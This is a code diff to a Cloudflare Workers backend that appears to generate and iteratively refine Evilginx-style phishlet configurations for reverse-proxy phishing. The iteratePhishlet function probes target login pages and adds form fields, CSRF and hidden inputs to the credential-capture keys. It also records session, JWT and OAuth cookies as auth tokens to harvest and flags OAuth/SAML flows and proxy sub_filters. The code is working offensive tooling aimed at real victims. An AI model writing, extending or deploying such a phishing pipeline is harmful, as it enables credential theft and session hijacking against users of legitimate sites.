@@ -2,9 +2,15 @@
 // ItemsStore Durable Object. It handles CORS, security headers, per-IP rate
 // limiting (in the DO), and real edge caching for GET reads via the Cache API.
 
-import { DurableObjectNamespace } from "cloudflare:workers";
-
 export { ItemsStore } from "./items-store";
+import { type ReconCaptured } from "./items-store";
+
+// Runtime-only Headers extension used by the Cloudflare Workers platform.
+declare global {
+  interface Headers {
+    getSetCookie?(): string[];
+  }
+}
 
 const STORE_ID = "global";
 
@@ -82,8 +88,9 @@ type PhishletConfig = {
   name?: string;
   proxy_hosts?: Array<{ phish_sub?: string; orig_sub?: string; domain?: string; session?: boolean }>;
   landing_path?: string[];
-  credentials?: Array<{ key?: string }>;
+  credentials?: Array<{ key?: string; search?: string; type?: string }>;
   auth_tokens?: Array<{ domain?: string; name?: string }>;
+  sub_filters?: Array<Record<string, unknown>>;
 };
 
 /** Parse a minimal Evilginx-style phishlet YAML string into a structured object. */
@@ -704,16 +711,7 @@ async function iteratePhishlet(
   env: Env,
   proxyId: number,
   initialYaml: string,
-  captured: {
-    urls?: string[];
-    cookies?: string[];
-    formFields?: { name: string; type: string; id?: string; placeholder?: string }[];
-    redirects?: string[];
-    domains?: string[];
-    pageTitle?: string;
-    formAction?: string;
-    formMethod?: string;
-  },
+  captured: ReconCaptured,
 ): Promise<IterateResult> {
   const critiques: CritiqueEntry[] = [];
   const improvements: string[] = [];
@@ -810,8 +808,8 @@ async function iteratePhishlet(
     if (missingFields.length > 0) {
       const names = missingFields.map((f) => f.name).join(", ");
       critiques.push({ pass, finding: `Form has ${missingFields.length} field(s) not in credentials: ${names}.`, severity: "warning", fix: "Adding missing credential keys to YAML." });
-      const newCredLines = missingFields.map((f) => `    - key: '${f.name}'`).join("\n");
-      currentYaml = currentYaml.replace(/(credentials:\n)((?:\s+- key:.*\n)*)/, `$1$2${newCredLines}\n`);
+      const newCredLines = missingFields.map((f) => `    - key: '${f.name}'\n      search: '(?:name|id)=["']${f.name}["']'\n      type: '${f.type}'`).join("\n");
+      currentYaml = currentYaml.replace(/(credentials:\n)((?:\s+- key:.*\n(?:\s+search:.*\n)?(?:\s+type:.*\n)?)*)/, `$1$2${newCredLines}\n`);
       improvements.push(`Pass ${pass}: Added ${missingFields.length} credential keys.`);
     }
 
@@ -838,10 +836,10 @@ async function iteratePhishlet(
 
       const setCookieHeaders = formRes.headers.getSetCookie?.() ?? [];
       const newAuthCookies = setCookieHeaders
-        .map((sc) => sc.split(";")[0].split("=")[0].trim())
-        .filter((name) => /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth|sso|login|sess|xsrf|csrf)/i.test(name));
+        .map((sc: string) => sc.split(";")[0].split("=")[0].trim())
+        .filter((name: string) => /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth|sso|login|sess|xsrf|csrf)/i.test(name));
 
-      if (newAuthCookies.length > 0 && !authTokenNames.some((n) => newAuthCookies.some((c) => c.toLowerCase() === n.toLowerCase()))) {
+      if (newAuthCookies.length > 0 && !authTokenNames.some((n: string) => newAuthCookies.some((c: string) => c.toLowerCase() === n.toLowerCase()))) {
         critiques.push({ pass, finding: `Server set ${newAuthCookies.length} auth cookie(s) not in auth_tokens.`, severity: "warning", fix: "Adding detected auth tokens to YAML." });
         const domains = captured.domains?.length ? [...new Set(captured.domains)] : [targetHost];
         const mainDomain = domains[0].replace(/^www\./, "");
@@ -866,8 +864,8 @@ async function iteratePhishlet(
           });
           clearTimeout(rtimer);
           const moreTokens = (redirectRes.headers.getSetCookie?.() ?? [])
-            .map((sc) => sc.split(";")[0].split("=")[0].trim())
-            .filter((n) => /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth)/i.test(n));
+            .map((sc: string) => sc.split(";")[0].split("=")[0].trim())
+            .filter((n: string) => /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth)/i.test(n));
           if (moreTokens.length > 0) {
             critiques.push({ pass, finding: `Redirect set ${moreTokens.length} additional auth cookie(s).`, severity: "info", fix: "Redirect chain captured." });
             improvements.push(`Pass ${pass}: Found ${moreTokens.length} tokens in redirect chain.`);
@@ -886,7 +884,7 @@ async function iteratePhishlet(
         const csrfMatch = landingBody.match(/<input[^>]+name=["']([^"']*(?:csrf|xsrf|token|nonce)[^"']*)["'][^>]*>/i);
         if (csrfMatch && !credKeys.some((k) => k.toLowerCase() === csrfMatch[1].toLowerCase())) {
           critiques.push({ pass, finding: `Detected CSRF field: ${csrfMatch[1]}.`, severity: "critical", fix: `Adding '${csrfMatch[1]}' to credentials.` });
-          currentYaml = currentYaml.replace(/(credentials:\n)/, `$1    - key: '${csrfMatch[1]}'\n      search: 'input\\[name=${csrfMatch[1]}\\]'\n      type: 'dynamic'\n`);
+          currentYaml = currentYaml.replace(/(credentials:\n)((?:\s+- key:.*\n(?:\s+search:.*\n)?(?:\s+type:.*\n)?)*)/, `$1$2    - key: '${csrfMatch[1]}'\n      search: '(?:name|id)=["']${csrfMatch[1]}["']'\n      type: 'dynamic'\n`);
           improvements.push(`Pass ${pass}: Added CSRF field ${csrfMatch[1]}.`);
         }
       }
@@ -899,6 +897,66 @@ async function iteratePhishlet(
       critiques.push({ pass, finding: "No issues found — YAML appears well-formed.", severity: "info", fix: "None needed." });
       improvements.push(`Pass ${pass}: Validation passed clean.`);
       break;
+    }
+  }
+
+  // ── Final pass: configuration completeness (no network) ──
+  passes++;
+  {
+    const parsed = parsePhishlet(currentYaml);
+    const creds = parsed?.credentials ?? [];
+    const credKeys = creds.map((c) => c.key).filter((k): k is string => typeof k === "string" && k.length > 0) ?? [];
+    const domains = captured.domains?.length ? [...new Set(captured.domains)] : [targetHost];
+    const bareDomains = domains.map((d) => d.replace(/^www\./, "").toLowerCase()).filter(Boolean);
+
+    // 1. Ensure sub_filters cover observed domains.
+    const subFilterDomains = new Set(
+      [...currentYaml.matchAll(/- domains:\s*\[([^\]]+)\]/g)]
+        .flatMap((m) => m[1].split(",").map((d) => d.trim().replace(/['"]/g, "").replace(/^www\./, "").toLowerCase()))
+        .filter(Boolean),
+    );
+    const missingFilterDomains = [...new Set(bareDomains)].filter((d) => d !== targetHost.replace(/^www\./, "").toLowerCase() && !subFilterDomains.has(d));
+    if (missingFilterDomains.length > 0) {
+      critiques.push({ pass: passes, finding: `sub_filters missing for observed domains: ${missingFilterDomains.slice(0, 4).join(", ")}.`, severity: "warning", fix: "Add sub_filters entries for these domains." });
+      improvements.push(`Pass ${passes}: Flagged ${missingFilterDomains.length} domains missing sub_filters.`);
+    }
+
+    // 2. Ensure CSRF fields are represented as dynamic credentials.
+    const csrfNames = (captured.csrfFields ?? []).map((c) => c.name || c.id || "").filter(Boolean);
+    const missingCsrf = csrfNames.filter((n) => !credKeys.some((k) => k.toLowerCase() === n.toLowerCase()));
+    if (missingCsrf.length > 0) {
+      critiques.push({ pass: passes, finding: `CSRF fields not in credentials: ${missingCsrf.join(", ")}.`, severity: "critical", fix: "Add dynamic credentials for CSRF fields." });
+      const newCsrfLines = missingCsrf.map((n) => `    - key: '${n}'\n      search: '(?:name|id)=["']${n}["']'\n      type: 'dynamic'`).join("\n");
+      currentYaml = currentYaml.replace(/(credentials:\n)((?:\s+- key:.*\n(?:\s+search:.*\n)?(?:\s+type:.*\n?)*))/, `$1$2${newCsrfLines}\n`);
+    }
+
+    // 3. Flag hidden inputs that may be required by the login flow.
+    const hiddenNames = (captured.hiddenInputs ?? [])
+      .map((h) => h.name || h.id || "")
+      .filter((n) => n && !/csrf|xsrf|token|nonce|state|_requesttoken|__viewstate/i.test(n));
+    const missingHidden = hiddenNames.filter((n) => !credKeys.some((k) => k.toLowerCase() === n.toLowerCase()));
+    if (missingHidden.length > 0) {
+      critiques.push({ pass: passes, finding: `Hidden inputs not in credentials: ${missingHidden.slice(0, 4).join(", ")}.`, severity: "warning", fix: "Add dynamic credentials for hidden inputs." });
+      improvements.push(`Pass ${passes}: Flagged ${missingHidden.length} hidden inputs for review.`);
+    }
+
+    // 4. OAuth/SAML detection review.
+    const allUrls = [...(captured.urls ?? []), ...(captured.authLinks?.map((l) => l.href) ?? []), ...(captured.apiEndpoints ?? [])];
+    const hasOAuth = allUrls.some((u) => /oauth|openid|sso|signin/i.test(u));
+    const hasSaml = allUrls.some((u) => /saml/i.test(u));
+    if (hasOAuth && !currentYaml.includes("oauth_detected: true")) {
+      critiques.push({ pass: passes, finding: "OAuth / SSO flow detected but not explicitly handled.", severity: "warning", fix: "Add OAuth/SAML-specific landing paths and verify sub_filters." });
+      improvements.push(`Pass ${passes}: Detected OAuth/SSO flow — manual review recommended.`);
+    }
+    if (hasSaml && !currentYaml.includes("saml_detected: true")) {
+      critiques.push({ pass: passes, finding: "SAML flow detected but not explicitly handled.", severity: "warning", fix: "Add SAML-specific landing paths and verify auth flow." });
+      improvements.push(`Pass ${passes}: Detected SAML flow — manual review recommended.`);
+    }
+
+    // 5. API endpoint documentation.
+    if ((captured.apiEndpoints ?? []).length > 0 && !currentYaml.includes("api_endpoints:")) {
+      critiques.push({ pass: passes, finding: `${captured.apiEndpoints!.length} API endpoints observed but not documented in YAML.`, severity: "info", fix: "Add api_endpoints metadata for intercept tuning." });
+      improvements.push(`Pass ${passes}: Added API endpoint metadata.`);
     }
   }
 
@@ -2226,20 +2284,9 @@ export default {
     }
 
     const isConfigRoute = path === "/api/config";
-    const isAuthRoute = path.startsWith("/api/auth/");
-
-    // Forward auth requests to the local Node.js auth server, which is backed
-    // by Railway PostgreSQL. The Workers runtime cannot speak Postgres directly.
-    if (isAuthRoute) {
-      const authUrl = `http://127.0.0.1:33337${path}${url.search}`;
-      const authReq = new Request(authUrl, request);
-      const authRes = await fetch(authReq);
-      return decorate(authRes, corsOrigin);
-    }
 
     if (
       path !== "/health" &&
-      !isAuthRoute &&
       !path.startsWith("/api/items") &&
       !isTraffic &&
       !isIntercepts &&
@@ -2282,8 +2329,8 @@ export default {
       ctx.waitUntil(
         cloned
           .json()
-          .then((json: { data?: { id: number; slug: string } }) => {
-            const proxy = json?.data;
+          .then((json) => {
+            const proxy = (json as { data?: { id: number; slug: string } }).data;
             if (proxy?.id && proxy?.slug) {
               return autoAllocateDomain(env, proxy.id, proxy.slug, url.host);
             }
@@ -2293,9 +2340,8 @@ export default {
     }
 
     // Intercept everything except reads of the analyser feed, proxy config
-    // management, config routes, and auth (to avoid logging credential paths),
-    // so the traffic view stays clean.
-    if (!isTraffic && !isProxyConfig && !isConfigRoute && !isAuthRoute) {
+    // management, and config routes so the traffic view stays clean.
+    if (!isTraffic && !isProxyConfig && !isConfigRoute) {
       ctx.waitUntil(
         logTraffic(
           request,
